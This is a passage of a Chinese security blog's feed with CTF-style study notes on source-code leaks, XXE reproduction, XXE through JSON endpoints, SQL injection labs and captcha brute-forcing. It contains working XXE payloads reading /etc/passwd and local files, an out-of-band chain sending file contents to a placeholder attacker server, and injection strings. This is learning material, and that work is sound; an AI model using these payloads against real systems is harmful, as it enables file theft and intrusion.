title="vim临时文件"></a>vim临时文件</h4><p>程序员使用vim编辑器编写index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php。</p><p>2017年的东华杯出现过类似的题目</p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；<br>例如：<br>index.php的备份文件则为index.php~</p><p>还有很多，以后慢慢补上</p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">参考链接</a></p><p><a href="https://yangzcc.github.io/2017/12/26/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" target="_blank" rel="noopener">朋友链接</a></p><h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><p>发现一个很不错的检测源码泄漏工具 php代码泄露检测<br><a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">php代码泄露检测工具</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot;&gt;&lt;a href=&quot;#2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot; class=&quot;headerlink&quot; title=&quot;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot;&gt;&lt;/a&gt;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&lt;/h4&gt;&lt;h3 id=&quot;git源码泄漏&quot;&gt;&lt;a href=&quot;#git源码泄漏&quot; class=&quot;headerlink&quot; title=&quot;.git源码泄漏&quot;&gt;&lt;/a&gt;.git源码泄漏&lt;/h3&gt;&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>xxe漏洞的复现解析</title>
    <link href="http://yoursite.com/2018/07/06/xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/07/06/xxe漏洞复现/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:44:20.273Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://www.jianshu.com/p/163879fc1018" target="_blank" rel="noopener">https://www.jianshu.com/p/163879fc1018</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当XML文件中出现关键字”SYSTEM”定义的“实体”（DOCTYPE头部标签中会呈现），便可通过XML文件中定义的’实体’ , 访问本地或者远程的内容。这时候，XML解析器在SYSTEM的作用下从URI中读取内容，并允许它在XML文档中被替换，从而造成外部实体攻击。此时，Web应用如果产生数据回显，则会将URL中的数据呈现在应用界面上。<br>而如果Web端注意到这一点，没有设置回显，那么攻击者可以将数据通过外数据通道发送到攻击者服务器，从而达到攻击效果。<br><a id="more"></a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里用phpstudy以及自己的服务器进行搭建环境</p><p>首先本地根目录下写两个文件</p><p>test.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"> &lt;!ENTITY milin SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/pwd.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;milin;&lt;/a&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>pwd.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21212121(任意都可以,假设这个文本是攻击者想要的内容)</span><br></pre></td></tr></table></figure><ul><li>&lt;&lt;&lt;EOF ….. EOF; 这中间不对敏感字符进行转义</li><li>simplexml_load_string()函数:转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素</li></ul><p>然后访问本地文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%28X5A%25L5JMQQ5@HX4K%5D%7DBP0M.png" alt="image"></p><p>可以看到pwd.txt的文件成功地被读取了出来</p><h2 id="无回显的情况"><a href="#无回显的情况" class="headerlink" title="无回显的情况"></a>无回显的情况</h2><p>但是如果没有回显，即没有print_r($data),这样就没法读取到pwd.txt了，这里的办法是将回显数据通过外数据通道发送到另一个服务器</p><p>这里联系自己的服务器进行攻击</p><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"> &lt;!ENTITY % file SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/pwd.txt&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % xml SYSTEM &quot;http://服务器_IP/milin.xml&quot;&gt;</span><br><span class="line">%xml;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>然后在自己的服务器放个milin.xml文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://服务器_IP/get.php?file=%file;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></p><p>然后为了接受这个文件的数据，再构造一个get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">file_put_contents(&quot;key.txt&quot;, $_GET[&apos;file&apos;]) ; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>最后访问URL模拟攻击:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php</span><br></pre></td></tr></table></figure></p><p>会发现在自己的服务器目录生成了一个key.txt,里面内容为你本地的pwd.txt</p><h2 id="遇到的一些无法复现的问题"><a href="#遇到的一些无法复现的问题" class="headerlink" title="遇到的一些无法复现的问题"></a>遇到的一些无法复现的问题</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/7F6003B4ACBF683F4BE602542DAD0CF6.png" alt="image"></p><p>我也遇到了这个函数的问题，但切换版本总是一样结果，后来把phpstudy删了重装结果好了= =</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;https://www.jianshu.com/p/163879fc1018&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/163879fc1018&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;当XML文件中出现关键字”SYSTEM”定义的“实体”（DOCTYPE头部标签中会呈现），便可通过XML文件中定义的’实体’ , 访问本地或者远程的内容。这时候，XML解析器在SYSTEM的作用下从URI中读取内容，并允许它在XML文档中被替换，从而造成外部实体攻击。此时，Web应用如果产生数据回显，则会将URL中的数据呈现在应用界面上。&lt;br&gt;而如果Web端注意到这一点，没有设置回显，那么攻击者可以将数据通过外数据通道发送到攻击者服务器，从而达到攻击效果。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>chrome 代理设置ss(ssr)</title>
    <link href="http://yoursite.com/2018/07/06/%E5%85%B3%E4%BA%8ESSR%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2018/07/06/关于SSR配置/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:36:53.625Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://www.jianshu.com/p/4c0553dbc970" target="_blank" rel="noopener">https://www.jianshu.com/p/4c0553dbc970</a><br><a id="more"></a></p><p>先看这个吧，害怕三连.jpg</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;https://www.jianshu.com/p/4c0553dbc970&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/4c0553dbc970&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在JSON中玩转XXE攻击</title>
    <link href="http://yoursite.com/2018/07/06/xxe%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/07/06/xxe漏洞/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:44:14.081Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="http://bobao.360.cn/learning/detail/360.html" target="_blank" rel="noopener">在JSON中玩转XXE攻击 </a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在刷题的过程中遇到了一个没见过的新姿势，这里记录一下加深对xxe漏洞的认识</p><h2 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h2><p>要了解xxe漏洞前先了解xml文档的基础，这是基本知识<br><a id="more"></a><br>和html的区别为:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XML 被设计为传输和存储数据，其焦点是数据的内容。</span><br><span class="line">HTML 被设计用来显示数据，其焦点是数据的外观。</span><br></pre></td></tr></table></figure></p><p>这样就好理解多了，xml还有一些关键知识如dtd实体要了解，有点长，自行百度理解<br><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a></p><h2 id="Content-Type-在JSON中进行XXE攻击"><a href="#Content-Type-在JSON中进行XXE攻击" class="headerlink" title="Content-Type 在JSON中进行XXE攻击"></a>Content-Type 在JSON中进行XXE攻击</h2><p>XXE是一种针对XML终端实施的攻击，黑客想要实施这种攻击，需要在XML的payload包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取WEB服务器的文件系统，通过UNC路径访问远程文件系统，或者通过HTTP/HTTPS连接到任意主机。在下面的例子中，我们将一个外部实体指向了WEB服务器上的/etc/passwd，该实体就是包含在XML的payload里的。</p><p>一个简洁有效的xxe攻击如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">[some xml content..]</span><br><span class="line">&lt;element&gt;&amp;xxe;&lt;/element&gt;</span><br><span class="line">[some xml content..]</span><br></pre></td></tr></table></figure></p><p>接下来看利用Content-Type头和HTTP请求的payload，是否也能黑掉JSON的终端。下面是一个JSON请求样本，它将Content-Type设置为application/json，其中精简了大部分内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line">HTTP Response:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure><p>如果Content-Type头被修改为application/xml，客户端会告诉服务器post过去的数据是XML格式的。但如果你实际传过去的不是xml格式的话，服务器不会进行解析，并且会报如下的错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 38</span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line">HTTP Request:</span><br><span class="line">HTTP/1.1 500 Internal Server Error</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 127</span><br><span class="line">&#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>说明服务器能够处理XML格式和JSON格式的数据，但现在服务器收到的真实数据格式并不是在Content-Type里声明的XML格式，所以这里自然不能被解析啦。为了解决这个问题，JSON格式被强行转换为XML格式。</p><p>Original JSON<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>XML Conversion<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br></pre></td></tr></table></figure></p><p>然而，这样直接转换过来的XML文档很明显是无效的，它并没有XML格式文件所必须的\<root>元素。如果这个XML格式的文件被发送到服务器上，有可能服务器会为此响应一个错误消息，所有最好的做法是为该转换过的XML文档加一个\<root>元素。</root></root></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP Response:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure><p>因为在这里服务器是可以接收XML的数据的，黑客能由此对JSON终端实施XXE攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>黑客在这里就可以读到/etc/passwd的文件内容</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不是每一个JSON终端都会接收XML格式，改变Content-Type一般没有用处，有可能只能得到415的数据类型不支持错误。但是，JSON转换为XML的攻击不会只限制于通过post传输带有JSON内容的payload，如果JSON的参数被转换为XML，服务器会自己判断content type的真实类型。</p><p>学到了很多，以后有关于xxe漏洞的新姿势继续补上</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;http://bobao.360.cn/learning/detail/360.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;在JSON中玩转XXE攻击 &lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在刷题的过程中遇到了一个没见过的新姿势，这里记录一下加深对xxe漏洞的认识&lt;/p&gt;
&lt;h2 id=&quot;xml基础&quot;&gt;&lt;a href=&quot;#xml基础&quot; class=&quot;headerlink&quot; title=&quot;xml基础&quot;&gt;&lt;/a&gt;xml基础&lt;/h2&gt;&lt;p&gt;要了解xxe漏洞前先了解xml文档的基础，这是基本知识&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全实验室-注入关</title>
    <link href="http://yoursite.com/2018/07/06/wangluo3/"/>
    <id>http://yoursite.com/2018/07/06/wangluo3/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:43:59.752Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-最简单的SQL注入"><a href="#1-最简单的SQL注入" class="headerlink" title="1.最简单的SQL注入"></a>1.最简单的SQL注入</h3><h3 id="Tips题目里有简单提示"><a href="#Tips题目里有简单提示" class="headerlink" title="Tips题目里有简单提示"></a>Tips题目里有简单提示</h3><a id="more"></a><p><img src="http://p1vrkwaxt.bkt.clouddn.com/1YHOVS8SDQR8GPHE$0%5DPNFV.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/A%28_A%28%25%5B850EMEWN0435IOL7.png" alt="image"></p><h3 id="2-最简单的SQL注入-熟悉注入环境-最简单的SQL注入"><a href="#2-最简单的SQL注入-熟悉注入环境-最简单的SQL注入" class="headerlink" title="2.最简单的SQL注入(熟悉注入环境)最简单的SQL注入"></a>2.最简单的SQL注入(熟悉注入环境)<br>最简单的SQL注入</h3><ul><li>查看源代码得到注入点id</li><li>构造url id=1,id=1’发现存在注入点</li><li>id=1 or 1 =1得到flag</li></ul><h3 id="3-防注入小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入"><a href="#3-防注入小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入" class="headerlink" title="3.防注入小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入!"></a>3.防注入<br>小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入!</h3><h4 id="原理-sql宽字节注入"><a href="#原理-sql宽字节注入" class="headerlink" title="原理:sql宽字节注入"></a>原理:sql宽字节注入</h4><p><img src="http://p1vrkwaxt.bkt.clouddn.com/YEUJ%28OGKT@X%60%7DAWA8L~G9%7BU.png" alt="image"><br><br>报错说明sql存在宽字节注入<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/JCJ3N%25L%60%5B%5DKNIH%28$%2801T0YW.png" alt="image"><br><br>查询第3行的数据得到flag</p><h3 id="4-到底能不能回显小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？"><a href="#4-到底能不能回显小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？" class="headerlink" title="4.到底能不能回显小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？"></a>4.到底能不能回显<br>小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？</h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-最简单的SQL注入&quot;&gt;&lt;a href=&quot;#1-最简单的SQL注入&quot; class=&quot;headerlink&quot; title=&quot;1.最简单的SQL注入&quot;&gt;&lt;/a&gt;1.最简单的SQL注入&lt;/h3&gt;&lt;h3 id=&quot;Tips题目里有简单提示&quot;&gt;&lt;a href=&quot;#Tips题目里有简单提示&quot; class=&quot;headerlink&quot; title=&quot;Tips题目里有简单提示&quot;&gt;&lt;/a&gt;Tips题目里有简单提示&lt;/h3&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全实验室-脚本关</title>
    <link href="http://yoursite.com/2018/07/06/wangluo2/"/>
    <id>http://yoursite.com/2018/07/06/wangluo2/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:43:53.577Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-key又又找不到了小明这次哭了，key又找不到了！！！-key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！"><a href="#1-key又又找不到了小明这次哭了，key又找不到了！！！-key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！" class="headerlink" title="1.key又又找不到了小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！"></a>1.key又又找不到了<br>小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！</h3><p>burpsuite抓包在响应处发现key</p><h3 id="2-快速口算小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？"><a href="#2-快速口算小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？" class="headerlink" title="2.快速口算小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？"></a>2.快速口算<br>小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br><span class="line">#-*-coding:utf-8-*- </span><br><span class="line">import requests, re</span><br><span class="line">url = &apos;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&apos;</span><br><span class="line">s = requests.session()</span><br><span class="line">c = s.get(url).content</span><br><span class="line">print c</span><br><span class="line">r = re.findall(r&apos;[\d]&#123;2,&#125;&apos;,c)</span><br><span class="line">r=int(r[0])*int(r[1])+int(r[2])*(int(r[3])+int(r[4]))</span><br><span class="line">c1 = s.post(url, data=&#123;&apos;v&apos;:r&#125;).content</span><br><span class="line">print c1.decode(&apos;utf-8&apos;)</span><br></pre></td></tr></table></figure><ul><li><a href="https://www.cnblogs.com/tina-python/p/5508402.html" target="_blank" rel="noopener">正则表达式详解</a><br></li><li>正则 re.findall  的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组）</li><li><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">requests详解</a></li><li>decode的作用是将其他编码的字符串转换成unicode编码<h3 id="3-这个题目是空的"><a href="#3-这个题目是空的" class="headerlink" title="3.这个题目是空的"></a>3.这个题目是空的</h3><h3 id="Tips-这个题目真不是随便设置的。-什么才是空的呢？"><a href="#Tips-这个题目真不是随便设置的。-什么才是空的呢？" class="headerlink" title="Tips:这个题目真不是随便设置的。 什么才是空的呢？"></a>Tips:这个题目真不是随便设置的。 什么才是空的呢？</h3><h3 id="通关地址：没有，请直接提交答案-小写即可"><a href="#通关地址：没有，请直接提交答案-小写即可" class="headerlink" title="通关地址：没有，请直接提交答案(小写即可)"></a>通关地址：没有，请直接提交答案(小写即可)</h3>0,null,none,no等等试一下就出来了<br>结果为null<h3 id="4-怎么就是不弹出key呢？提交说明：提交前14个字符即可过关"><a href="#4-怎么就是不弹出key呢？提交说明：提交前14个字符即可过关" class="headerlink" title="4.怎么就是不弹出key呢？提交说明：提交前14个字符即可过关"></a>4.怎么就是不弹出key呢？<br>提交说明：提交前14个字符即可过关</h3><h4 id="这题做不出来，据说是把前面几个函数去掉即可，多次试了下还是无用"><a href="#这题做不出来，据说是把前面几个函数去掉即可，多次试了下还是无用" class="headerlink" title="这题做不出来，据说是把前面几个函数去掉即可，多次试了下还是无用"></a>这题做不出来，据说是把前面几个函数去掉即可，多次试了下还是无用</h4><h3 id="5-逗比验证码第一期逗比的验证码，有没有难道不一样吗？"><a href="#5-逗比验证码第一期逗比的验证码，有没有难道不一样吗？" class="headerlink" title="5.逗比验证码第一期逗比的验证码，有没有难道不一样吗？"></a>5.逗比验证码第一期<br>逗比的验证码，有没有难道不一样吗？</h3><img src="http://p1vrkwaxt.bkt.clouddn.com/%7D7@JZH2121QBZY28L_Q%7D%7BLO.png" alt="image"><br><br>burpsuite抓包<br><img src="http://p1vrkwaxt.bkt.clouddn.com/YD5J%60R7GM7P$E31NTYXCGX3.png" alt="image"><br><br>观察后发现Cookie是保持不变的,验证码与session对应，session会话不会被刷新，一直存在,所以可以用burpsuite intruder爆破密码<br><img src="http://p1vrkwaxt.bkt.clouddn.com/U%5D22E%25F5_~%28I%5B3%7BKDQP%7BNG3.png" alt="image"><br>pwd=1238,得到key<h3 id="6-逗比验证码第二期验证便失效的验证码"><a href="#6-逗比验证码第二期验证便失效的验证码" class="headerlink" title="6.逗比验证码第二期验证便失效的验证码"></a>6.逗比验证码第二期<br>验证便失效的验证码</h3>burpsuite测试后将验证码设置空再爆破密码</li></ul><p>据说原因是请求头包含了这两句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive  </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><h3 id="7-逗比的验证码第三期（SESSION）尼玛，验证码怎么可以这样逗比。。验证码做成这样，你家里人知道吗？"><a href="#7-逗比的验证码第三期（SESSION）尼玛，验证码怎么可以这样逗比。。验证码做成这样，你家里人知道吗？" class="headerlink" 